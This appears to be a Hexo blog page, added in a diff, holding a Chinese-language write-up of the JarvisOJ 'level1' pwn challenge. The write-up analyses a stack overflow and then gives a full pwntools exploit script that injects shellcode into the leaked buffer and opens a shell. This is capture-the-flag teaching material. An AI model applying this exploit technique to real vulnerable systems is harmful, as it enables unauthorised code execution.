@@ -1,0 +1,438 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="嘤嘤嘤，拖了很长时间，现在才来写这道题的学习路程">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2020 06 12 JarvisOJ-Level1">
+<meta property="og:url" content="http://example.com/2020/06/12/09_PWN/2020-06-12-JarvisOJ-Level1/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="嘤嘤嘤，拖了很长时间，现在才来写这道题的学习路程">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2020/06/12/09_PWN/2020-06-12-JarvisOJ-Level1/2020-06-12-JarvisOJ-Level1/2020-08-02-20-38-22.png">
+<meta property="og:image" content="http://example.com/2020/06/12/09_PWN/2020-06-12-JarvisOJ-Level1/2020-06-12-JarvisOJ-Level1/2020-08-03-14-19-40.png">
+<meta property="og:image" content="http://example.com/2020/06/12/09_PWN/2020-06-12-JarvisOJ-Level1/2020-06-12-JarvisOJ-Level1/2020-08-03-14-22-55.png">
+<meta property="og:image" content="http://example.com/2020/06/12/09_PWN/2020-06-12-JarvisOJ-Level1/2020-06-12-JarvisOJ-Level1/2020-08-03-14-24-51.png">
+<meta property="og:image" content="http://example.com/2020/06/12/09_PWN/2020-06-12-JarvisOJ-Level1/2020-06-12-JarvisOJ-Level1/2020-08-03-14-28-25.png">
+<meta property="og:image" content="http://example.com/2020/06/12/09_PWN/2020-06-12-JarvisOJ-Level1/2020-06-12-JarvisOJ-Level1/2020-08-03-14-38-55.png">
+<meta property="og:image" content="http://example.com/2020/06/12/09_PWN/2020-06-12-JarvisOJ-Level1/2020-06-12-JarvisOJ-Level1/2020-08-03-14-55-34.png">
+<meta property="og:image" content="http://example.com/2020/06/12/09_PWN/2020-06-12-JarvisOJ-Level1/2020-06-12-JarvisOJ-Level1/2020-08-03-17-29-23.png">
+<meta property="article:published_time" content="2020-06-12T07:31:22.000Z">
+<meta property="article:modified_time" content="2020-08-03T09:29:26.000Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="JarvisOJ">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="level">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2020/06/12/09_PWN/2020-06-12-JarvisOJ-Level1/2020-06-12-JarvisOJ-Level1/2020-08-02-20-38-22.png">
+
+<link rel="canonical" href="http://example.com/2020/06/12/09_PWN/2020-06-12-JarvisOJ-Level1/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>2020 06 12 JarvisOJ-Level1 | Hexo</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Hexo</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2020/06/12/09_PWN/2020-06-12-JarvisOJ-Level1/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          2020 06 12 JarvisOJ-Level1
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2020-06-12 15:31:22" itemprop="dateCreated datePublished" datetime="2020-06-12T15:31:22+08:00">2020-06-12</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2020-08-03 17:29:26" itemprop="dateModified" datetime="2020-08-03T17:29:26+08:00">2020-08-03</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/PWN/" itemprop="url" rel="index"><span itemprop="name">PWN</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <blockquote>
+<p>嘤嘤嘤，拖了很长时间，现在才来写这道题的学习路程</p>
+</blockquote>
+<a id="more"></a>
+<h1 id="检查文件"><a href="#检查文件" class="headerlink" title="检查文件"></a>检查文件</h1><ul>
+<li>这一步是非常重要的，千万不要忘记了<br><img src="2020-06-12-JarvisOJ-Level1/2020-08-02-20-38-22.png"></li>
+<li>随后我们查壳检查，使用IDA看看利用的位置在哪里<br><img src="2020-06-12-JarvisOJ-Level1/2020-08-03-14-19-40.png"></li>
+</ul>
+<h1 id="漏洞点分析"><a href="#漏洞点分析" class="headerlink" title="漏洞点分析"></a>漏洞点分析</h1><ul>
+<li>可以在第一个函数中发现溢出的位置，溢出的变量是<code>[ebp-88h]</code><br><img src="2020-06-12-JarvisOJ-Level1/2020-08-03-14-22-55.png"></li>
+<li>检查栈空间的布局<br><img src="2020-06-12-JarvisOJ-Level1/2020-08-03-14-24-51.png"></li>
+<li>可以判断溢出需要填充的字节数:<code>88+4+ret</code></li>
+</ul>
+<h1 id="PayLoad构造"><a href="#PayLoad构造" class="headerlink" title="PayLoad构造"></a>PayLoad构造</h1><ul>
+<li>检查文件中是否存在后门，<del>莫得，扔回收站</del><br><img src="2020-06-12-JarvisOJ-Level1/2020-08-03-14-28-25.png"></li>
+<li>检查字符串信息<br><img src="2020-06-12-JarvisOJ-Level1/2020-08-03-14-38-55.png"></li>
+<li>嘤嘤嘤，太狠了，第一个直接GetShell，第二个就挑战大魔王呗？<br><img src="2020-06-12-JarvisOJ-Level1/2020-08-03-14-55-34.png"></li>
+<li>我们可以怎么做，首先，我们可以发现堆栈可执行(没有NX保护)，第二，会返回<code>buf</code>的首地址给我们</li>
+<li>所以我们可以直接构造ShellCode发送到Buf中，然后通过覆盖返回地址到Buf来执行我们的ShellCode</li>
+</ul>
+<h1 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> pwn</span><br><span class="line"><span class="comment"># pwn.context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">sh = pwn.process(<span class="string">&#x27;./level1&#x27;</span>)</span><br><span class="line"><span class="comment"># nc pwn2.jarvisoj.com 9877</span></span><br><span class="line"><span class="comment"># sh = pwn.remote(&quot;pwn2.jarvisoj.com&quot;, 9877)</span></span><br><span class="line"><span class="comment"># 获取到&#x27;this:&#x27;为止</span></span><br><span class="line">_ = sh.recvuntil(<span class="string">b&quot;this:&quot;</span>)</span><br><span class="line"><span class="comment"># 截取剩下的Buf首地址：[0xffffda70]，通过16进制强转</span></span><br><span class="line">buf_addr = int(sh.recv(<span class="number">10</span>), <span class="number">16</span>)</span><br><span class="line">print(<span class="string">f&#x27;[ Get Buf ] 获取到Buf首地址：<span class="subst">&#123;hex(buf_addr)&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="comment"># 清除接下来的其他返回值</span></span><br><span class="line">_ = sh.recv()</span><br><span class="line"><span class="comment"># 构造payload，第一部分ShellCode,同时填充缓冲区，第二部分覆盖EBP，第三部分是返回地址，返回到Buf首地址</span></span><br><span class="line">payload = pwn.asm(pwn.shellcraft.sh()).ljust(<span class="number">0x88</span>)+<span class="string">b&#x27;A&#x27;</span>*<span class="number">4</span>+pwn.p32(buf_addr)</span><br><span class="line">print(<span class="string">f&#x27;[ShellCode] 使用PwnTools自动生成的ShellCode...\n<span class="subst">&#123;pwn.shellcraft.sh()&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="comment"># Send PayLoad Get Shell</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+<p><img src="2020-06-12-JarvisOJ-Level1/2020-08-03-17-29-23.png"></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/JarvisOJ/" rel="tag"># JarvisOJ</a>
+              <a href="/tags/pwn/" rel="tag"># pwn</a>
+              <a href="/tags/level/" rel="tag"># level</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/06/10/05_%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0/2020-06-10-%E4%BD%BF%E7%94%A8WSL%E6%9C%AC%E6%9C%BAVSCode%E8%B0%83%E8%AF%95Python/" rel="prev" title="使用WSL本机VSCode调试Python">
+      <i class="fa fa-chevron-left"></i> 使用WSL本机VSCode调试Python
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2020/06/20/09_PWN/2020-06-20-Kali%E4%B8%8A%E7%9A%84Docker%E4%B8%8EPWN/" rel="next" title="2020 06 20 Kali上的Docker与PWN">
+      2020 06 20 Kali上的Docker与PWN <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%A3%80%E6%9F%A5%E6%96%87%E4%BB%B6"><span class="nav-number">1.</span> <span class="nav-text">检查文件</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E7%82%B9%E5%88%86%E6%9E%90"><span class="nav-number">2.</span> <span class="nav-text">漏洞点分析</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#PayLoad%E6%9E%84%E9%80%A0"><span class="nav-number">3.</span> <span class="nav-text">PayLoad构造</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E5%AE%9E%E7%8E%B0"><span class="nav-number">4.</span> <span class="nav-text">代码实现</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">John Doe</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">49</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+        <span class="site-state-item-count">24</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+        <span class="site-state-item-count">83</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">John Doe</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a>
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
